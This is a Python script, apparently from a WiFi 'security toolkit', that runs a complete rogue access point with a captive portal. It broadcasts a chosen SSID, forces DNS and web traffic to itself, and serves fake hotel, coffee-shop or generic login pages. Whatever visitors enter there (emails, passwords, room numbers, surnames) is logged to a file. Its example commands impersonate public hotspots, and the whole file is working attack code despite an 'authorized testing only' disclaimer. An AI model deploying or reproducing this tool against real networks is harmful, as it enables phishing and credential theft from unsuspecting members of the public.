#!/usr/bin/env python3
"""
Captive Portal for Hoover WiFi Security Toolkit
Sets up a rogue AP with a fake login page to capture credentials
For authorized security testing and research only
"""

import sys
import os
import argparse
import subprocess
import signal
import threading
import time
import tempfile
from datetime import datetime
from typing import Optional

from flask import Flask, request as flask_request, redirect

from utils import validate_interface, require_root, setup_logging


PORTAL_TEMPLATES: dict[str, dict] = {
    "default": {
        "title": "WiFi Login",
        "heading": "Connect to WiFi",
        "subtitle": "Please sign in to access the internet",
        "fields": [
            {"name": "email", "type": "email", "label": "Email Address", "placeholder": "you@example.com"},
            {"name": "password", "type": "password", "label": "Password", "placeholder": "Enter password"},
        ],
        "button": "Connect",
    },
    "hotel": {
        "title": "Hotel Guest WiFi",
        "heading": "Welcome, Guest",
        "subtitle": "Enter your room details to connect",
        "fields": [
            {"name": "room_number", "type": "text", "label": "Room Number", "placeholder": "e.g. 302"},
            {"name": "last_name", "type": "text", "label": "Last Name", "placeholder": "Guest last name"},
        ],
        "button": "Connect",
    },
    "coffee": {
        "title": "Free WiFi",
        "heading": "Sign in to continue",
        "subtitle": "Enter your email to get online",
        "fields": [
            {"name": "email", "type": "email", "label": "Email Address", "placeholder": "you@example.com"},
        ],
        "button": "Get Online",
    },
}


class CaptivePortal:
    def __init__(self, interface: str, ssid: str = "Free-WiFi",
                 channel: int = 6, portal_template: str = "default",
                 log_file: str = "captures/portal_creds.log",
                 bind_address: str = "192.168.100.1",
                 dns_redirect: bool = True,
                 portal_port: int = 8080) -> None:
        self.interface: str = interface
        self.ssid: str = ssid
        self.channel: int = channel
        self.portal_template: str = portal_template
        self.log_file: str = log_file
        self.bind_address: str = bind_address
        self.dns_redirect: bool = dns_redirect
        self.portal_port: int = portal_port
        self.logger = setup_logging("captive_portal")
        self._shutdown_requested: bool = False
        self._hostapd_proc: Optional[subprocess.Popen] = None
        self._dnsmasq_proc: Optional[subprocess.Popen] = None
        self._portal_app: Optional[Flask] = None
        self.captured_creds: list[dict] = []
        self._temp_files: list[str] = []

    def _generate_portal_html(self) -> str:
        template = PORTAL_TEMPLATES.get(self.portal_template, PORTAL_TEMPLATES["default"])

        fields_html = ""
        for field in template["fields"]:
            fields_html += (
                f'<div class="form-group">'
                f'<label for="{field["name"]}">{field["label"]}</label>'
                f'<input type="{field["type"]}" name="{field["name"]}" '
                f'id="{field["name"]}" placeholder="{field["placeholder"]}" required>'
                f'</div>\n'
            )

        return f"""<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>{template["title"]}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center}}
.container{{background:#fff;border-radius:12px;padding:40px;max-width:400px;width:90%;box-shadow:0 4px 24px rgba(0,0,0,.1)}}
h1{{font-size:1.5rem;margin-bottom:8px;color:#333}}
.subtitle{{color:#666;margin-bottom:24px;font-size:.9rem}}
.form-group{{margin-bottom:16px}}
label{{display:block;margin-bottom:4px;font-size:.85rem;color:#555;font-weight:600}}
input{{width:100%;padding:10px 12px;border:1px solid #ddd;border-radius:6px;font-size:1rem}}
input:focus{{outline:none;border-color:#007aff;box-shadow:0 0 0 3px rgba(0,122,255,.15)}}
button{{width:100%;padding:12px;background:#007aff;color:#fff;border:none;border-radius:6px;font-size:1rem;cursor:pointer;margin-top:8px}}
button:hover{{background:#0066d6}}
.footer{{text-align:center;margin-top:16px;font-size:.75rem;color:#999}}
</style></head><body>
<div class="container">
<h1>{template["heading"]}</h1>
<p class="subtitle">{template["subtitle"]}</p>
<form method="POST" action="/login">
{fields_html}
<button type="submit">{template["button"]}</button>
</form>
<p class="footer">By connecting, you agree to the Terms of Service</p>
</div></body></html>"""

    def _generate_success_html(self) -> str:
        return """<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>Connected</title>
<style>
body{font-family:-apple-system,sans-serif;background:#f5f5f5;min-height:100vh;display:flex;align-items:center;justify-content:center}
.container{background:#fff;border-radius:12px;padding:40px;max-width:400px;width:90%;text-align:center;box-shadow:0 4px 24px rgba(0,0,0,.1)}
.check{font-size:3rem;margin-bottom:16px}
h1{font-size:1.3rem;color:#333;margin-bottom:8px}
p{color:#666;font-size:.9rem}
</style></head><body>
<div class="container">
<div class="check">&#10004;</div>
<h1>Connected!</h1>
<p>You are now connected to the internet.</p>
</div></body></html>"""

    def _create_portal_app(self) -> Flask:
        portal_app = Flask(__name__)
        portal_app.config["SECRET_KEY"] = os.urandom(24).hex()
        portal_html = self._generate_portal_html()
        success_html = self._generate_success_html()
        portal_self = self

        @portal_app.route("/")
        def portal_index():
            return portal_html

        @portal_app.route("/login", methods=["POST"])
        def portal_login():
            creds = {
                "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                "source_ip": flask_request.remote_addr,
            }
            for field in PORTAL_TEMPLATES.get(
                portal_self.portal_template, PORTAL_TEMPLATES["default"]
            )["fields"]:
                creds[field["name"]] = flask_request.form.get(field["name"], "")

            portal_self._log_credentials(creds)
            return success_html

        @portal_app.route("/generate_204")
        @portal_app.route("/hotspot-detect.html")
        @portal_app.route("/connecttest.txt")
        @portal_app.route("/ncsi.txt")
        @portal_app.route("/redirect")
        def captive_redirect():
            return redirect("/")

        return portal_app

    def _setup_ap(self) -> bool:
        hostapd_conf = (
            f"interface={self.interface}\n"
            f"driver=nl80211\n"
            f"ssid={self.ssid}\n"
            f"hw_mode=g\n"
            f"channel={self.channel}\n"
            f"wmm_enabled=0\n"
            f"auth_algs=1\n"
        )

        conf_file = tempfile.NamedTemporaryFile(
            mode="w", suffix="_hostapd.conf", delete=False
        )
        conf_file.write(hostapd_conf)
        conf_file.close()
        self._temp_files.append(conf_file.name)

        try:
            subprocess.run(
                ["ip", "addr", "flush", "dev", self.interface],
                capture_output=True, timeout=5,
            )
            subprocess.run(
                ["ip", "addr", "add", f"{self.bind_address}/24", "dev", self.interface],
                capture_output=True, timeout=5,
            )
            subprocess.run(
                ["ip", "link", "set", self.interface, "up"],
                capture_output=True, timeout=5,
            )
        except (subprocess.TimeoutExpired, FileNotFoundError) as e:
            self.logger.error("Failed to configure interface: %s", e)
            return False

        try:
            self._hostapd_proc = subprocess.Popen(
                ["hostapd", conf_file.name],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            )
            time.sleep(2)
            if self._hostapd_proc.poll() is not None:
                self.logger.error("hostapd failed to start")
                return False
            self.logger.info("hostapd started (SSID: %s, channel: %d)", self.ssid, self.channel)
            return True
        except FileNotFoundError:
            self.logger.error("hostapd not found. Install with: apt install hostapd")
            return False

    def _setup_dns(self) -> bool:
        if not self.dns_redirect:
            return True

        dnsmasq_conf = (
            f"interface={self.interface}\n"
            f"dhcp-range=192.168.100.10,192.168.100.250,12h\n"
            f"dhcp-option=3,{self.bind_address}\n"
            f"dhcp-option=6,{self.bind_address}\n"
            f"address=/#/{self.bind_address}\n"
            f"log-queries\n"
            f"log-dhcp\n"
        )

        conf_file = tempfile.NamedTemporaryFile(
            mode="w", suffix="_dnsmasq.conf", delete=False
        )
        conf_file.write(dnsmasq_conf)
        conf_file.close()
        self._temp_files.append(conf_file.name)

        try:
            self._dnsmasq_proc = subprocess.Popen(
                ["dnsmasq", "-C", conf_file.name, "-d"],
                stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            )
            time.sleep(1)
            if self._dnsmasq_proc.poll() is not None:
                self.logger.error("dnsmasq failed to start")
                return False
            self.logger.info("dnsmasq started (DNS redirect enabled)")
            return True
        except FileNotFoundError:
            self.logger.error("dnsmasq not found. Install with: apt install dnsmasq")
            return False

    def _setup_iptables(self) -> None:
        rules = [
            ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.interface,
             "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", str(self.portal_port)],
            ["iptables", "-t", "nat", "-A", "PREROUTING", "-i", self.interface,
             "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", str(self.portal_port)],
        ]
        for rule in rules:
            try:
                subprocess.run(rule, capture_output=True, timeout=5)
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass
        self.logger.info("iptables rules added")

    def _cleanup_iptables(self) -> None:
        rules = [
            ["iptables", "-t", "nat", "-D", "PREROUTING", "-i", self.interface,
             "-p", "tcp", "--dport", "80", "-j", "REDIRECT", "--to-port", str(self.portal_port)],
            ["iptables", "-t", "nat", "-D", "PREROUTING", "-i", self.interface,
             "-p", "tcp", "--dport", "443", "-j", "REDIRECT", "--to-port", str(self.portal_port)],
        ]
        for rule in rules:
            try:
                subprocess.run(rule, capture_output=True, timeout=5)
            except (subprocess.TimeoutExpired, FileNotFoundError):
                pass

    def _log_credentials(self, creds: dict) -> None:
        self.captured_creds.append(creds)
        self.logger.info("Captured credentials from %s: %s", creds.get("source_ip", "?"), creds)

        try:
            os.makedirs(os.path.dirname(self.log_file) or ".", exist_ok=True)
            with open(self.log_file, "a", encoding="utf-8") as f:
                parts = [f"{creds['timestamp']}"]
                for k, v in creds.items():
                    if k != "timestamp":
                        parts.append(f"{k}={v}")
                f.write(" | ".join(parts) + "\n")
        except Exception as e:
            self.logger.error("Failed to write credentials log: %s", e)

    def start(self) -> None:
        if not validate_interface(self.interface):
            self.logger.error("Invalid interface: %s", self.interface)
            sys.exit(1)

        self.logger.info("Starting Captive Portal")
        self.logger.info("  Interface: %s", self.interface)
        self.logger.info("  SSID: %s", self.ssid)
        self.logger.info("  Channel: %d", self.channel)
        self.logger.info("  Template: %s", self.portal_template)
        self.logger.info("  Portal: http://%s:%d", self.bind_address, self.portal_port)

        def signal_handler(sig, frame):
            self._shutdown_requested = True

        signal.signal(signal.SIGINT, signal_handler)
        signal.signal(signal.SIGTERM, signal_handler)

        if not self._setup_ap():
            self.stop()
            sys.exit(1)

        if not self._setup_dns():
            self.stop()
            sys.exit(1)

        self._setup_iptables()
        self._portal_app = self._create_portal_app()

        self.logger.info("Captive portal running. Press Ctrl+C to stop.")
        try:
            self._portal_app.run(
                host="0.0.0.0", port=self.portal_port,
                debug=False, use_reloader=False,
            )
        except Exception:
            if not self._shutdown_requested:
                raise
        finally:
            self.stop()

    def stop(self) -> None:
        self.logger.info("Shutting down captive portal...")

        for proc, name in [
            (self._hostapd_proc, "hostapd"),
            (self._dnsmasq_proc, "dnsmasq"),
        ]:
            if proc:
                try:
                    proc.terminate()
                    proc.wait(timeout=5)
                except (subprocess.TimeoutExpired, ProcessLookupError):
                    try:
                        proc.kill()
                        proc.wait(timeout=3)
                    except Exception:
                        pass

        self._cleanup_iptables()

        for tmp in self._temp_files:
            try:
                os.unlink(tmp)
            except OSError:
                pass

        self.logger.info(
            "Captive portal stopped. %d credential sets captured.", len(self.captured_creds)
        )


def main() -> None:
    parser = argparse.ArgumentParser(
        description="Captive Portal - Fake login page for WiFi security testing",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Start with default template
  sudo python3 captive_portal.py -i wlan0 -s "Free-WiFi"

  # Hotel template
  sudo python3 captive_portal.py -i wlan0 -s "Hotel-Guest" -t hotel

  # Custom channel and output
  sudo python3 captive_portal.py -i wlan0 -s "CoffeeShop" -t coffee -ch 11

Note: Requires hostapd and dnsmasq installed.
      For authorized security testing only.
        """,
    )

    parser.add_argument("-i", "--interface", required=True,
                        help="Wireless interface")
    parser.add_argument("-s", "--ssid", default="Free-WiFi",
                        help="SSID to broadcast (default: Free-WiFi)")
    parser.add_argument("-ch", "--channel", type=int, default=6,
                        help="WiFi channel (default: 6)")
    parser.add_argument("-t", "--template", default="default",
                        choices=list(PORTAL_TEMPLATES.keys()),
                        help="Portal template (default: default)")
    parser.add_argument("-o", "--output", default="captures/portal_creds.log",
                        help="Credential log file")
    parser.add_argument("--bind", default="192.168.100.1",
                        help="Portal bind address (default: 192.168.100.1)")
    parser.add_argument("--no-dns-redirect", action="store_true",
                        help="Disable DNS redirect")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")

    args = parser.parse_args()
    require_root()

    portal = CaptivePortal(
        interface=args.interface,
        ssid=args.ssid,
        channel=args.channel,
        portal_template=args.template,
        log_file=args.output,
        bind_address=args.bind,
        dns_redirect=not args.no_dns_redirect,
    )

    portal.start()


if __name__ == "__main__":
    main()
